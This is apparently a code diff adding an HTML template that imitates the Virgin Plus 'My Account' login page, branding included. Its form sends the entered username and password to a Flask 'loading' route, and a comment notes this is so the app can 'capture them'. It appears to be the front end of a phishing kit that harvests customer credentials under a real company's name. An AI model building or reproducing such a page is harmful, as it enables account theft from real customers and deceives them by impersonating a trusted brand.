@@ -1,0 +1,130 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <!-- Ensures the mobile device renders at actual width, so it looks zoomed/correct -->
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Virgin Plus My Account</title>
+  <link rel="stylesheet" href="{{ url_for('static', filename='style.css') }}">
+</head>
+<body>
+
+<div class="site-wrapper">
+
+  <!-- RED HEADER -->
+  <header class="red-header">
+    <!-- Desktop offset for the logo -->
+    <div class="header-left">
+      <img src="static/images/virgin-logo.png" alt="Virgin Plus Logo" />
+    </div>
+
+    <!-- Desktop nav (FR + user icon). Hidden on mobile -->
+    <div class="desktop-nav">
+      <a href="#" class="lang-link">FR</a>
+      <a href="#" class="user-icon">&#128100;</a>
+    </div>
+
+    <!-- Hamburger (only on mobile) -->
+    <div class="hamburger" onclick="toggleMobileMenu()">
+      &#9776; <!-- The “3 lines” icon -->
+    </div>
+  </header>
+
+  <!-- MOBILE MENU (dark slide-out) -->
+  <nav class="mobile-menu" id="mobileMenu">
+    <div class="mobile-menu-header">
+      <span class="close-btn" onclick="toggleMobileMenu()">&times;</span>
+      <img src="static/images/virgin-logo.png" alt="Virgin Plus Logo" />
+    </div>
+    <ul>
+      <li><a href="#">FRANÇAIS</a></li>
+      <li><a href="#">TOP UP PREPAID</a></li>
+      <li><a href="#">ACTIVATE PREPAID</a></li>
+      <li><a href="#">MY ACCOUNT</a></li>
+    </ul>
+  </nav>
+
+  <!-- MAIN CONTENT -->
+  <main class="login-container">
+    <!-- RIGHT COL physically first in HTML => “Welcome” 
+         On desktop, we reorder it to the right side. 
+         On mobile, it stays on top.
+    -->
+    <div class="right-col">
+      <h1>Welcome to My Account</h1>
+      <!-- IMPORTANT: Add action="{{ url_for('loading') }}" and method="POST" 
+           plus name="username" and name="password" so Flask can capture them.
+      -->
+      <form action="{{ url_for('loading') }}" method="POST">
+        <label class="input-label" for="username">10-digit Virgin Plus number or username</label>
+        <input 
+          type="text" 
+          id="username" 
+          name="username" 
+          placeholder="Email/username or number"
+        >
+
+        <a href="#" class="tiny-link">Use a different Virgin Plus number or username</a>
+
+        <label class="input-label" for="password">Password</label>
+        <input 
+          type="password" 
+          id="password" 
+          name="password" 
+          placeholder="Enter your password"
+        >
+
+        <a href="#" class="tiny-link">Forgot password or username?</a>
+
+        <button class="login-btn" type="submit">Log in</button>
+        <p class="prepaid-link">On Prepaid? <a href="#">Log in here</a></p>
+      </form>
+    </div>
+
+    <!-- A horizontal divider (hidden on desktop, visible on mobile),
+         to separate “Welcome” (above) and “Not registered yet?” (below).
+    -->
+    <hr class="mobile-divider">
+
+    <!-- LEFT COL physically second => “Not registered yet?”
+         On desktop, we reorder it to the left side. 
+         On mobile, it’s below the divider => second.
+    -->
+    <div class="left-col">
+      <h1>Not registered yet?</h1>
+      <p>My Account lets you:</p>
+      <ul>
+        <li><strong class="red-text">PAY</strong> your bill</li>
+        <li><strong class="red-text">VIEW</strong> bill history and usage info</li>
+        <li><strong class="red-text">REVIEW</strong> your plan and add-ons</li>
+      </ul>
+      <button class="register-btn">Register now</button>
+    </div>
+  </main>
+
+  <!-- FOOTER -->
+  <footer class="page-footer">
+    <div class="footer-links">
+      <a href="#">Contact Us</a> |
+      <a href="#">Legal &amp; Regulatory</a> |
+      <a href="#">Track your order</a> |
+      <a href="#">Wireless Code Member Rights</a> |
+      <a href="#">Provide Feedback</a>
+    </div>
+    <div class="footer-note">
+      &copy; Virgin Plus. All rights reserved.
+    </div>
+  </footer>
+
+</div>
+
+<!-- Simple JS to toggle the mobile menu -->
+<script>
+function toggleMobileMenu() {
+  var menu = document.getElementById("mobileMenu");
+  menu.classList.toggle("open");
+}
+</script>
+
+</body>
+</html>
